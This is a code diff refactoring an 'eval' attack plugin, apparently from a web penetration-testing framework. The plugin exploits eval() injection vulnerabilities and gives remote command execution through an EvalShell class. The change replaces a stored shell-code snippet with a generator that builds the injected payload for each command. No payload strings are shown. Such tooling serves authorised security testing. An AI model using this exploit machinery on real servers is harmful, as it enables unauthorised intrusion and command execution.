@@ -39,7 +39,7 @@ class eval(AttackPlugin):
         AttackPlugin.__init__(self)
 
         # Internal variables
-        self._shell_code = None
+        self._shellcode_generator = None
 
     def get_attack_type(self):
         """
@@ -69,7 +69,7 @@ class eval(AttackPlugin):
         if self._verify_vuln(vuln_obj):
             # Create the shell object
             shell_obj = EvalShell(vuln_obj, self._uri_opener, self.worker_pool,
-                                  self._shell_code)
+                                  self._shellcode_generator)
             return shell_obj
         else:
             return None
@@ -83,10 +83,12 @@ class eval(AttackPlugin):
         """
         # Get the shells
         extension = vuln_obj.get_url().get_extension()
-        # I get a list of tuples with code and extension to use
-        shell_code_list = shell_handler.get_shell_code(extension)
 
-        for code, real_extension in shell_code_list:
+        # I get a list of tuples with code and extension to use
+        null_command = ''
+        shell_code_list = shell_handler.get_shell_code(extension, null_command)
+
+        for code, real_extension, shellcode_generator in shell_code_list:
             # Prepare for exploitation...
             function_reference = getattr(self._uri_opener,
                                          vuln_obj.get_method())
@@ -97,7 +99,7 @@ class eval(AttackPlugin):
                 http_res = function_reference(vuln_obj.get_url(),
                                               str(data_container))
             except BaseFrameworkException, w3:
-                msg = 'An error ocurred while trying to exploit the eval()'\
+                msg = 'An error occurred while trying to exploit the eval()'\
                       ' vulnerability. Original exception: "%s".'
                 om.out.debug(msg % w3)
             else:
@@ -105,7 +107,7 @@ class eval(AttackPlugin):
                     msg = 'Sucessfully exploited eval() vulnerability using'\
                           ' the following code snippet: "%s...".' % code[:35]
                     om.out.debug(msg)
-                    self._shell_code = code
+                    self._shellcode_generator = shellcode_generator
                     return True
 
         # All failed!
@@ -133,10 +135,10 @@ class eval(AttackPlugin):
 
 class EvalShell(ExecShell):
 
-    def __init__(self, vuln, uri_opener, worker_pool, code):
+    def __init__(self, vuln, uri_opener, worker_pool, shellcode_generator):
         super(EvalShell, self).__init__(vuln, uri_opener, worker_pool)
         
-        self._shell_code = code
+        self.shellcode_generator = shellcode_generator
         
     @exec_debug
     def execute(self, command):
@@ -150,8 +152,8 @@ class EvalShell(ExecShell):
         # Lets send the command.
         function_reference = getattr(self._uri_opener, self.get_method())
         exploit_dc = self.get_dc()
-        exploit_dc['cmd'] = command
-        exploit_dc[self.get_var()] = self._shell_code
+        exploit_dc[self.get_var()] = self.shellcode_generator(command)
+
         try:
             response = function_reference(self.get_url(), str(exploit_dc))
         except BaseFrameworkException, w3:
